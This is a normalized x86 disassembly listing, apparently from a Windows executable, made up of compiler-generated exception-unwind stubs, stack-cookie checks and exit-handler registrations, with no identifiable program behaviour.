jmp sub_4481e9
sub_44e2f7
mov eax [ ebp + 0xc ]
add eax 0xc
jmp sub_406a33
sub_44e302
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
push [ ebp + 0xc ]
call sub_4069e4
sub_44e31b
lea eax [ ebp - 0x2c ]
push eax
call sub_4069e4
retn
sub_44e325
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44e340
mov eax [ ebp - 0x5c ]
add eax 0xc
jmp sub_406a33
sub_44e34b
mov eax [ ebp - 0x60 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x60 ] 0xfffffffe
push [ ebp - 0x5c ]
call sub_4069e4
sub_44e364
lea esi [ ebp - 0x78 ]
jmp j_sub_40cc34
sub_44e36c
lea esi [ ebp - 0x48 ]
jmp j_sub_40cc34#3
sub_44e374
lea eax [ ebp - 0x94 ]
push eax
call sub_4069e4
retn
sub_44e381
lea eax [ ebp - 0xb0 ]
push eax
call sub_4069e4
retn
sub_44e38e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb4 ]
xor ecx eax
call sub_4247dc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44e3b6
mov ecx [ ebp + 0x8 ]
jmp sub_403aac
sub_44e3be
mov eax [ ebp + 0xc ]
jmp sub_40458f
sub_44e3c6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44e3e1
lea eax [ ebp - 0x3c ]
jmp sub_403a28
sub_44e3e9
lea eax [ ebp - 0x34 ]
push eax
call sub_406a44
retn
sub_44e3f3
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_4247dc
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44e41b
lea eax [ ebp - 0x40 ]
jmp sub_403a28
sub_44e423
lea ecx [ ebp - 0x2c ]
jmp sub_403aac
sub_44e42b
lea eax [ ebp - 0x6c ]
push eax
call sub_4069e4
retn
sub_44e435
lea eax [ ebp - 0x88 ]
push eax
call sub_4069e4
retn
sub_44e442
mov eax [ ebp - 0x4c ]
jmp sub_40458f
sub_44e44a
mov eax [ ebp - 0x48 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x48 ] 0xfffffffe
mov eax [ ebp - 0x4c ]
jmp sub_403a28
sub_44e463
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_4247dc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44e48b
lea ecx [ ebp - 0x454 ]
jmp sub_404663
sub_44e496
lea eax [ ebp - 0x244 ]
push eax
call sub_40466e
retn
sub_44e4a3
mov eax [ ebp - 0x248 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x248 ] 0xfffffffe
mov eax [ ebp - 0x24c ]
jmp sub_403a28
sub_44e4c5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x458 ]
xor ecx eax
call sub_4247dc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44e4ed
lea ecx [ ebp - 0x2c ]
jmp sub_403aac
sub_44e4f5
lea eax [ ebp - 0x90 ]
jmp sub_406a33
sub_44e500
lea eax [ ebp - 0x9c ]
push eax
call sub_4069e4
retn
sub_44e50d
lea eax [ ebp - 0xb8 ]
jmp sub_406a33
sub_44e518
lea eax [ ebp - 0xc4 ]
push eax
call sub_4069e4
retn
sub_44e525
mov eax [ ebp - 0x74 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x74 ] 0xfffffffe
push [ ebp - 0x58 ]
call sub_4069e4
sub_44e53e
lea eax [ ebp - 0xec ]
jmp sub_413fe0
sub_44e549
lea ecx [ ebp - 0x170 ]
jmp sub_40393a
sub_44e554
lea eax [ ebp - 0xa8 ]
jmp sub_404708
sub_44e55f
lea eax [ ebp - 0xf8 ]
jmp sub_413fe0
sub_44e56a
lea ecx [ ebp - 0x4c ]
jmp sub_411fc9
sub_44e572
lea eax [ ebp - 0x130 ]
push eax
call sub_4069e4
retn
sub_44e57f
lea eax [ ebp - 0x14c ]
push eax
call sub_4069e4
retn
sub_44e58c
lea ecx [ ebp - 0x194 ]
jmp sub_40393a
sub_44e597
lea eax [ ebp - 0x114 ]
push eax
call sub_4069e4
retn
sub_44e5a4
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e5b1
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e5be
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e5cb
lea eax [ ebp - 0x6c ]
jmp sub_413fe8
sub_44e5d3
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e5e0
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e5ed
lea eax [ ebp - 0x70 ]
jmp sub_413ff9
sub_44e5f5
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e602
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e60f
lea eax [ ebp - 0x6c ]
jmp sub_41400a
sub_44e617
lea eax [ ebp - 0xe0 ]
push eax
call sub_4069e4
retn
sub_44e624
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x198 ]
xor ecx eax
call sub_4247dc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4247dc
mov eax r--data
jmp sub_4481e9
sub_44e64c
push sub_44e707
call sub_42606a
pop ecx
retn
sub_44e658
push sub_44e712
call sub_42606a
pop ecx
retn
sub_44e664
push sub_44e71d
call sub_42606a
pop ecx
retn
sub_44e670
push sub_44e732
call sub_42606a
pop ecx
retn
sub_44e67c
push sub_44e728
call sub_42606a
pop ecx
retn
sub_44e688
mov ecx rw-data
call sub_4471a7
push sub_44e73c
call sub_42606a
pop ecx
retn
sub_44e69e
mov ecx rw-data
call sub_4471a7
push sub_44e746
call sub_42606a
pop ecx
retn
sub_44e6b4
push sub_44e750
call sub_42606a
pop ecx
retn
sub_44e6c0
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_44e6d4
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_44e6e8
mov [ rw-data ] r--data
retn
sub_44e6f3
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_425354
sub_44e707
mov [ rw-data ] r--data
retn
sub_44e712
mov [ rw-data ] r--data
retn
sub_44e71d
mov [ rw-data ] r--data
retn
sub_44e728
mov ecx rw-data
jmp sub_402f60
sub_44e732
mov ecx rw-data
jmp sub_446f0d
sub_44e73c
mov ecx rw-data
jmp sub_4471d8
sub_44e746
mov ecx rw-data
jmp sub_4471d8
sub_44e750
mov ecx rw-data
jmp sub_447ebb
